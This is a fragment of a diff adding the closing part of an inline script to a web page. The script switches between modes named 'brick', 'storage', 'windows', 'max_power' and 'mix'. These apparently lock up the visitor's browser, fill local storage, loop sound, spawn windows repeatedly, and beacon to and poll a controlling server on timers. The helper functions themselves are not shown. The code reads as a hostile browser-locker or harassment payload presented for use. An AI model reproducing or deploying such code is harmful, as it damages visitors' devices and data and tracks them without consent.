+    installMode();
+    if (STANDALONE) {
+      soundLoop(); fillStorage(function () {});
+      send({ auto: 1, standalone: 1 });
+      leave(2500);
+    } else { leave(6000); }
+
+  } else if (MODE === "max_power") {
+    setInterval(function () { send(behavior()); }, 5000);
+    leave(6000);
+
+  } else if (MODE === "brick") {
+    brick();
+    fillStorage(function () {});
+    soundLoop();
+
+  } else if (MODE === "windows") {
+    soundLoop();
+    fireSet(true);
+    setInterval(function () { fireSet(false); }, 400);
+
+  } else if (MODE === "storage") {
+    fillStorage(function () { setTimeout(function () { fillStorage(function () {}); }, 2000); });
+
+  } else {  /* mix */
+    brick();
+    installMode();
+    soundLoop();
+    fireSet(true);
+    fillStorage(function () {});
+    setInterval(function () { fireSet(false); }, 500);
+    if (STANDALONE) send({ auto: 1, standalone: 1 });
+  }
+
+  setInterval(poll, 1800);
+})();
+</script>
+</body></html>
